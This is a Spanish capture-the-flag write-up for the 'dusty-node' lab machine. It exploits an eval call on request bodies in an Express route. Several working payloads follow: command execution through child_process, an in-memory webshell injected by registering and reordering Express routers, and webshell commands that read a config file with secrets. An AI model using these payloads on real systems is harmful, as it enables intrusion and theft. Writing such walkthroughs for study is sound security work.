# Flag 3

Para la tercera flag vamos a explotar una vulnerabilidad de ejecución de código remoto en la función de añadir productos:

```javascript
// Create thing
router.post('/', auth, function (req, res, next) {
    if (req && req.decoded && req.decoded._doc &&  req.decoded._doc.rol == 1){
        var body = eval(req.body);

        if (body && body.title && body.autor && body.url) {
            var instance = new Thing();

            instance.title = body.title;
            instance.autor = body.autor;
            instance.url = body.url;

            instance.save(function (err, data) {
                if (err) {
                    res.status(500).json({sucess: false, message: err.message})
                } else {
                    res.json({sucess: true, data: data})
                }
            });
        } else {
            res.status(400).json({sucess: false, message: 'No valid parameters'})
        }
    } else {
        res.status(403).json({sucess: false, message: 'No authentification provided'})
    }
});
```

La vulnerabilidad se debe al uso de la función eval sobre parámetros que proporciona el usuario directamente, sin ningún tipo de control. Esto también sucede cuando se usan las funciones setTimeout y setInterval, pero la más común es eval. Para comprobar que sucede esta inyección podemos probar el siguiente payload:

```javascript
var d=new Date();
do{
	cd=new Date();
} while(cd-d<3000)
```

El cual debería hacer que la aplicación tardase unos 3 segundos en contestar.

![](evidences/ev6.png)

Habitualmente, el objeto de respuesta en las aplicaciones node se llama response o res aunque está a disponibilidad de cada programador llamarlo como quiera. Nuestro objetivo ahora es encontrar dicho objeto, para lo cual probamos dichos nombres

```javascript
response.end('testvalue9000')
```
```javascript
res.end('testvalue9000')
```

Con esto encontramos que el objeto de respuesta es res y ya podemos acceder al árbol de directorios usando, por ejemplo:

```javascript
res.end(require('fs').readdirSync('.').toString())
```

Ahora el objetivo sería conseguir una ejecución de comandos en la que pudiésemos obtener la salida, con el apaño que hemos sacado de [esta página](https://blog.gdssecurity.com/labs/2015/4/15/nodejs-server-side-javascript-injection-detection-exploitati.html) podríamos funcionar usando el siguiente payload:

```javascript
var fs = require('fs');
var cat = require('child_process').spawn('uname', ['-a']);
cat.stdout.on('data', function(data) {
fs.writeFile('/tmp/sddfr.txt', data)});
var out = fs.readFileSync('/tmp/sddfr.txt');
res.write(out); res.end()
```

El problema de esto es que se necesitan dos peticiones, la primera guarda el resultado en el archivo de texto y la segunda lo muestra, evidentemente la existencia de este fichero también es problemática ya que puede ser una evidencia del atacante. Visto que podemos ejecutar comandos en la máquina remota nos podemos hacer nuestra propia webshell para facilitar esta ejecución. Para ello necesitamos lo siguiente:

1. Hay que ser capaz de requerir el módulo que exporta la aplicación express, como es común que estemos en un router, dicho módulo estará en la carpeta superior.

    ```javascript
    try {
        var app = require('../app');
        var util = require('util');
        res.end(util.format(app))
    } catch (err) {
        res.end(err)
    }
    ```

2. Una vez que tenemos el módulo app podemos crear un router con nuestra webshell y registrarlo con app.use.

    ```javascript
    try {
        var app = require('../app');

        var router = express.Router();
        router.get('/', function(req, res, next){
            res.writeHead(200, {
                "Content-Type": "text/plain"
            });
            require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function(e, s, st) {
                res.end(s);
            });
        });
        app.use('/api/webshell', router);

        var util = require('util');
        res.end(util.format(app))
    } catch (err) {
        res.end(err)
    }
    ```

    Como resultado de este proceso tenemos un bonito 404 Not Found. ¿Porqué?. App tiene un elemento llamado __\_router__, podemos mirar si el router se registró correctamente:

    ```javascript
        // [...] Otras cosas
        { handle: [Function: serveStatic],
           name: 'serveStatic',
           params: {},
           path: '',
           keys: [],
           regexp: /^\/?(?=\/|$)/i,
           route: undefined },
         { handle: [Object],
           name: 'router',
           params: undefined,
           path: undefined,
           keys: [],
           regexp: /^\/api\/users\/?(?=\/|$)/i,
           route: undefined },
         { handle: [Object],
           name: 'router',
           params: {},
           path: '/api/things',
           keys: [],
           regexp: /^\/api\/things\/?(?=\/|$)/i,
           route: undefined },
         { handle: [Function],
           name: '<anonymous>',
           params: {},
           path: '',
           keys: [],
           regexp: /^\/?(?=\/|$)/i,
           route: undefined },
         { handle: [Function],
           name: '<anonymous>',
           params: {},
           path: '',
           keys: [],
           regexp: /^\/?(?=\/|$)/i,
           route: undefined },
         { handle: [Object],
           name: 'router',
           params: undefined,
           path: undefined,
           keys: [],
           regexp: /^\/api\/webshell\/?(?=\/|$)/i,
           route: undefined } ] }
    ```

3. El resultado del experimento anterior nos indica que el router se registró correctamente, sin embargo, sospecho que la arquitectura de Express matchea alguna regex antes de llegar a nuestra webshell evitando que esta llegue a ejecutarse, para comprobar la hipótesis podemos cambiar de orden los routers dentro de la pila:

    ```javascript
    try {
        var app = require('../app');
        var util = require('util');

        var r1 = app._router.stack[app._router.stack.length-1]
        var r2 = app._router.stack[app._router.stack.length-3]
        app._router.stack[app._router.stack.length-3] = r1
        app._router.stack[app._router.stack.length-1] = r2

        res.end(util.format(app._router.stack))
    } catch (err) {
        res.end(err)
    }
    ```

4. Profit!, con esto tendríamos una bonita webshell que no tiene persistencia en disco, es decir, simpemente está en el proceso de node que está corriendo de manera continua, aunque sería sencillo hacerla persistir y añadirle seguridad para que no la pueda usar cualquiera.

	![](evidences/ev7.png)

5. Encontrar la flag:

	```
  	192.168.99.100:1337/api/webshell?cmd=find / -iname "*dusty*"
  		/opt/dusty-project
    192.168.99.100:1337/api/webshell?cmd=ls /opt/dusty-project
        Makefile
        app.js
        bin
        config.js
        node_modules
        package.json
        public
        routes
        views
    192.168.99.100:1337/api/webshell?cmd=cat /opt/dusty-project/config.js
        /**
         * Created by snooze on 16/02/17.
         */

        module.exports = {
            'secret': 's3cret',
            'database': 'mongodb://localhost/test',
            'flag': '(RP1uR!XK:Dm'
        };
	```

Con esto se completan los 3 ejercicios de la máquina vulnerable *dusty-node* y esperemos que hayan resultado interesantes.
